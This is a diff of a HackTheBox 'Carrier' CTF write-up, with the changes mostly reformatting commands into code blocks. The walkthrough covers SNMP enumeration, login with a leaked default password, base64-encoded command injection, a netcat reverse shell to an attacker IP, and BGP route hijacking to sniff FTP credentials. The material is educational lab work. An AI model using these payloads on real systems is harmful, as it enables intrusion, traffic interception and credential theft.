@@ -5,9 +5,12 @@ tags:
   - hackthebox
   - writeup
   - ctf
+toc: true
+showdate: true
 ---
-
+{{%summary%}}
 ![img](/images/carrier-writeup/1.png)
+{{%/summary%}}
 
 When I first tackled Carrier it was the box with the most difficult path to root I had faced, but it's difficult in a very fun and most importantly interesting and educative way, so this box falls straight in my list of favorites, as it allowed me to explore new techniques, tools, and sharpen my enumeration skills. To get user access to the box I found a command injection flaw in the web application, where I logged in with the details found by querying SNMP. Finally, to grab the root flag I performed a BGP hijacking attack to change the routing options of a neighbor network, allowing me to see FTP traffic in that network containing the credentials to the server where the file was hosted.
 
@@ -47,8 +50,9 @@ Finally, for completion, in the /tools/ folder there is a remote.php file that d
 
 Let's think about the other error code though, the one saying credentials for login haven't been changed from the default settings: we can tell from the document that an account called "admin" exists, and that its password is the serial number found on the chassis of the device. Obviously we can't see that remotely, but if you remember the the results of the UDP scan from earloer we have found a SNMP service running on the target, and SNMP is used to store, obtain, and update information about a device and its state, so interrogating that service could give us some juicy info. To do that we can install snmpwalk:
 
-
-    $ sudo apt-get install snmpwalk
+```shell-session
+$ sudo apt-get install snmpwalk
+```
 
 Now, normally SNMP would require something called "community string" to accept a connection and thus respond to our queries, but it just so happens that there exists a default setting for this community string, which is literally "public", which we can attempt to use to contact the router in the hope of finding a default installation of the service that doesn't require any further guessing, investigation work, or mere bruteforcing:
 
@@ -57,9 +61,10 @@ Now, normally SNMP would require something called "community string" to accept a
 
 And it worked like a charm! The -c flag specifies the community string to use for authentication and -v tells the router which version of the protocol to use, in this case SNMPv1. What we receive is a single string, "SN#NET_45JDX23", which we can guess being the serial number of our target. Let's try it out!
 
-
-    User: admin
-    Pass: NET_45JDX23
+```shell-session
+User: admin
+Pass: NET_45JDX23
+```
 
 ![img](/images/carrier-writeup/10.png)
 
@@ -81,14 +86,17 @@ Clicking the "Verify status" button makes the page load what looks like the outp
 
 From this we can conclude that the web application tells the user running the service what parameters to give to the Diagnostics script, and once the script is executed its output is received. Since we can control what parameters to give the script, and it appears like the script would be something that reports the current status of a service called quagga, we can just append a semicolon to it to terminate that instruction and insert our own, encode it in base64, send everything in a POST request, and we will have achieved RCE:
 
-    quagga;ls -la ---> cXVhZ2dhO2xzIC1sYQ==
+```shell-session
+quagga;ls -la ---> cXVhZ2dhO2xzIC1sYQ==
+```
 
 ![img](/images/carrier-writeup/14.png)
 
 It worked and we can even see user.txt in the same folder! Before we grab it we can try to get proper shell access to the box though, we can do it with nc, with the "long version" of the reverse shell command, as it appears that the version installed doesn't support the -e flag:
 
-
-    quagga; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.67 9595 >/tmp/f
+```shell-session
+quagga; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.67 9595 >/tmp/f
+```
 
 ![img](/images/carrier-writeup/15.png)
 
@@ -110,12 +118,14 @@ Apparently the system we are using right now was misconfigured and caused a leak
 
 We find three different addresses, which leads me to believe the diagram we found on the web application where two other devices are talking to each other, one of which being our own, the one called "Lyghtspeed Networks", is basically a representation of the state of this router, connected to two more networks that we have seen are called "ZaZa TeleCom" and "CastCom", which have their own device numbers, AS200 and AS300, while we currently are on the AS100 device. We can confirm this by exploring the quagga folder, the one used by the web application, which I found by accident while looking inside the /opt/ directory after finding a shell script called restore.sh:
 
-    !/bin/sh
-    systemctl stop quagga
-    killall vtysh
-    cp /etc/quagga/zebra.conf.orig /etc/quagga/zebra.conf
-    cp /etc/quagga/bgpd.conf.orig /etc/quagga/bgpd.conf
-    systemctl start quagga
+```bash
+!/bin/sh
+systemctl stop quagga
+killall vtysh
+cp /etc/quagga/zebra.conf.orig /etc/quagga/zebra.conf
+cp /etc/quagga/bgpd.conf.orig /etc/quagga/bgpd.conf
+systemctl start quagga
+```
 
 This script stops the quagga service to restore the original configuration files, including one that clearly has to do with BGP, the Border Gateway Protocol, before starting it again. Let's take a closer look at these two configuration files:
 
@@ -173,28 +183,38 @@ The first command let me enter in configure mode, the second defines a list of p
 
 Once we have completed these steps we have to clear our current routes and re-adveirtse them from scratch, we do that with this command while still in the vtysh console:
 
-    r1# clear ip bgp * out
+```shell-session
+r1# clear ip bgp * out
+```
 
 When put together, what we did was essentially tell AS200 to come talk to us when he wants to contact the FTP server, but at the same time we made sure AS300 didn't know about this new rule we just put up so that once we receive the packets from AS200 we can forward them to AS300, and once there the third router would receive an answer from the FTP server, and send it to AS200 as intended. If our new route was to be advertised to AS300 then there would be no successful FTP connection, because if AS300 was aware of our new route it wouldn't pass requests to the FTP server directly, it would send it back to us because its routing table said we know where to find the FTP server, and then we would send it back to AS300, causing a loop that would eventually bring the TTL field of the packets to reach zero and thus die.
 
 Now that we have successfully hijacked the BGP entries we can fire up tcpdump on the box to listen for FTP packets:
 
-    root@r1:/opt# tcpdump -i eth2 'port 21' -w baudy.pcap
+```shell-session
+root@r1:/opt# tcpdump -i eth2 'port 21' -w baudy.pcap
+```
 
 After waiting for a minute or two we encode the file in base64 so we can copy and paste the string in a file on our attacker box:
 
-    root@r1:/opt# base64 -w0 baudy.pcap
+```shell-session
+root@r1:/opt# base64 -w0 baudy.pcap
+```
 
 Then decode it into a pcap file for Wireshark:
 
-    baud@fooxy:~$ base64 -d carrier > carrier.pcap
+```shell-session
+baud@fooxy:~$ base64 -d carrier > carrier.pcap
+```
 
 And now we should find the FTP credentials in the capture file:
 
 ![img](/images/carrier-writeup/28.png)
 
-    User: root
-    Pass: BGPtelc0rout1ng
+```shell-session
+User: root
+Pass: BGPtelc0rout1ng
+```
 
 With these we can finally grab the root flag by logging in the FTP server.
 
